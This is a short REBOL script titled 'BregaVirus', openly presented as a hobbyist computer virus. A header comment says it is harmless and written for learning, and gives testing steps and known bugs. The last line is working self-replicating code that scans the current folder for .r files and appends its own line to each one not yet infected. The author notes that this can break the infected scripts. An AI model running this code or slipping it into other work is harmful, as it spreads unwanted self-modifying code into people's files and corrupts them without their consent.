REBOL [
	Title: "BregaVirus"
	Purpose:
{
It's a very simple program of only one line of code that looks for *.r files in
the current folder to infect them, adding the virus code at the end.

The purpose of this program is not to cause damages to other computers (this
virus is completely harmless), but I'm just trying to learn more about this
wonderful platform and that's my small cotribution to the REBOL comunity.

To test it, create a folder and put on it the virus and a host file (any
REBOL script should work).

Known bugs:

- If you change the name of infected file the virus causes an error.
- If the host file is empty the virus causes an error (again).
}
]


foreach a read %. [if find a ".r" [if "a]]]]" <> last parse read a {} [do [write/append a newline write/append a replace/all last read/lines %virus.r %virus.r a]]]]